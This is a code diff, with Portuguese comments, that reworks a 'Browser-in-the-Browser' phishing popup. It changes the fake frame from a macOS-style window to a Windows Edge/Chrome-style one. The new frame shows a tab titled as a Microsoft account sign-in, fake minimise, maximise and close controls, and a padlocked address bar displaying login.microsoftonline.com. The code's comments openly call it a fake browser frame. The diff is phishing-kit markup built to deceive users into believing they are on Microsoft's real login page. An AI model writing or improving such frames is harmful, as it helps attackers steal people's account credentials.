@@ -48,30 +48,48 @@
   .secure{font-size:12px;color:#605e5c;margin:14px 0 0;}
   footer{text-align:center;color:#a19f9d;font-size:12px;padding:24px 0 40px;}
 
-  /* ---- Popup em CSS puro (checkbox hack) ---- */
+  /* ---- Popup em CSS puro (checkbox hack): janela de browser Windows ---- */
   #openModal,#closeModal{position:absolute;opacity:0;width:0;height:0;pointer-events:none;}
-  .modal-overlay{
-    display:none;position:fixed;inset:0;z-index:9999;
-    background:rgba(0,0,0,.45);
-    align-items:flex-start;justify-content:center;padding:60px 16px;
-  }
-  #openModal:checked ~ .modal-overlay{display:flex;}
+  /* Abre no canto inferior esquerdo, como uma janela separada. */
+  .modal-overlay{display:none;position:fixed;left:24px;bottom:24px;z-index:9999;}
+  #openModal:checked ~ .modal-overlay{display:block;}
   #closeModal:checked ~ .modal-overlay{display:none !important;}
-  /* Janela de browser falsa (Browser-in-the-Browser) */
-  .browser-win{position:relative;width:480px;max-width:100%;background:#fff;border-radius:8px;
-    box-shadow:0 14px 40px rgba(0,0,0,.45);overflow:hidden;border:1px solid #c9ccd1;}
-  .browser-bar{display:flex;align-items:center;gap:10px;background:#dfe1e5;padding:9px 12px;border-bottom:1px solid #c9ccd1;}
-  .browser-dots{display:flex;gap:7px;align-items:center;}
-  .browser-dots span{width:12px;height:12px;border-radius:50%;display:block;}
-  .browser-dots .d-r{background:#ff5f57;} .browser-dots .d-y{background:#febc2e;} .browser-dots .d-g{background:#28c840;}
-  .browser-x{width:12px;height:12px;border-radius:50%;background:#ff5f57;cursor:pointer;display:block;
-    position:relative;border:0;}
-  .browser-x:hover{filter:brightness(.9);}
-  .browser-addr{flex:1;display:flex;align-items:center;gap:7px;background:#fff;border-radius:14px;
-    padding:5px 12px;font-size:12px;color:#3c4043;border:1px solid #c9ccd1;}
-  .browser-addr svg{flex-shrink:0;}
-  .browser-addr .host{color:#202124;} .browser-addr .path{color:#5f6368;}
-  .browser-body{background:#fff;padding:34px 40px 30px;}
+
+  .browser-win{width:470px;max-width:calc(100vw - 48px);background:#fff;
+    border-radius:8px 8px 6px 6px;overflow:hidden;border:1px solid #9a9a9a;
+    box-shadow:0 20px 54px rgba(0,0,0,.55);font-family:'Segoe UI',system-ui,Arial,sans-serif;}
+
+  /* Tira de separadores (estilo Edge/Chrome no Windows) */
+  .tabstrip{display:flex;align-items:stretch;background:#d6dadf;height:40px;padding-top:7px;}
+  .tab{display:flex;align-items:center;gap:8px;background:#fff;border-radius:9px 9px 0 0;
+    padding:0 12px;margin-left:8px;min-width:190px;max-width:250px;font-size:12px;color:#202124;}
+  .tab .fav{display:inline-grid;grid-template-columns:7px 7px;grid-gap:1px;flex-shrink:0;}
+  .tab .fav i{width:7px;height:7px;display:block;}
+  .fav .r{background:#f25022}.fav .g{background:#7fba00}.fav .b{background:#00a4ef}.fav .y{background:#ffb900}
+  .tab .ttl{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+  .winctrls{display:flex;margin-left:auto;}
+  .winctrls .wc{width:46px;height:33px;display:flex;align-items:center;justify-content:center;
+    font-size:10px;color:#202124;cursor:default;line-height:1;}
+  .winctrls .wc:hover{background:#c6cace;}
+  .winctrls .wc.close{cursor:pointer;}
+  .winctrls .wc.close:hover{background:#e81123;color:#fff;}
+
+  /* Barra de ferramentas + barra de endereço */
+  .toolbar{display:flex;align-items:center;gap:12px;background:#f2f3f5;padding:8px 12px;border-bottom:1px solid #d6d9dd;}
+  .navbtns{display:flex;gap:6px;color:#5f6368;font-size:16px;line-height:1;}
+  .navbtns span{width:20px;text-align:center;}
+  .navbtns .dim{color:#c3c6ca;}
+  .omnibox{flex:1;display:flex;align-items:center;gap:8px;background:#fff;border:1px solid #d6d9dd;
+    border-radius:16px;padding:6px 13px;font-size:12px;color:#3c4043;}
+  .omnibox svg{flex-shrink:0;}
+  .omnibox .host{color:#202124;} .omnibox .path{color:#5f6368;}
+
+  .browser-body{background:#fff;padding:30px 36px 28px;}
+  @media (max-width:540px){
+    .modal-overlay{left:10px;right:10px;bottom:10px;}
+    .browser-win{width:100%;max-width:100%;}
+    .tab{min-width:0;}
+  }
   .modal-logo{display:inline-flex;align-items:center;gap:8px;font-size:14px;color:#5e5e5e;font-weight:600;margin-bottom:18px;}
   .browser-body h2{font-size:22px;font-weight:600;margin:0 0 6px;}
   .browser-body p.lead{font-size:14px;color:#1b1b1b;margin:0 0 20px;}
@@ -127,13 +145,21 @@
   <input type="checkbox" id="closeModal" aria-hidden="true" tabindex="-1">
   <div class="modal-overlay">
     <div class="browser-win">
-      <!-- Moldura de browser falsa (BitB): barra de endereço mostra o host real -->
-      <div class="browser-bar">
-        <div class="browser-dots">
-          <label for="closeModal" class="browser-x" aria-label="Fechar" title="Fechar"></label>
-          <span class="d-y"></span><span class="d-g"></span>
+      <!-- Moldura de browser Windows (BitB): separador + controlos + endereço real -->
+      <div class="tabstrip">
+        <div class="tab">
+          <span class="fav"><i class="r"></i><i class="g"></i><i class="b"></i><i class="y"></i></span>
+          <span class="ttl">Iniciar sessão na conta Microsoft</span>
         </div>
-        <div class="browser-addr">
+        <div class="winctrls">
+          <span class="wc min" title="Minimizar">&#9472;</span>
+          <span class="wc max" title="Maximizar">&#9633;</span>
+          <label for="closeModal" class="wc close" title="Fechar" aria-label="Fechar">&#10005;</label>
+        </div>
+      </div>
+      <div class="toolbar">
+        <div class="navbtns"><span>&#8592;</span><span class="dim">&#8594;</span><span>&#8635;</span></div>
+        <div class="omnibox">
           <svg width="12" height="12" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 1a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5zm-3 8V6a3 3 0 0 1 6 0v3H9z"></path></svg>
           <span class="host">login.microsoftonline.com</span><span class="path">/common/oauth2/deviceauth</span>
         </div>
